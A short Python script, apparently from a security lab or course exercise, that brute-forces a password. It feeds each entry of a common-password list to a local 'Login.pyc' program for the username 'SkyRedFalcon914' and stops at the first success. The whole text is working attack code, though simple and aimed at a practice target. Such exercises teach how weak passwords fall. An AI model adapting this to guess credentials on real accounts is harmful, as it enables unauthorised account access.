import subprocess
import time

start = time.time()
print("Start time:", start)

username = "SkyRedFalcon914"

with open("MostCommonPWs") as f:
    for pw in f:
        pw = pw.strip()
        r = subprocess.run(
            ["python3", "Login.pyc", username, pw],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL
        )
        if r.returncode == 0:
            print("Password found:", pw)
            break

end = time.time()
print("End time:", end)
print("Runtime:", end - start)
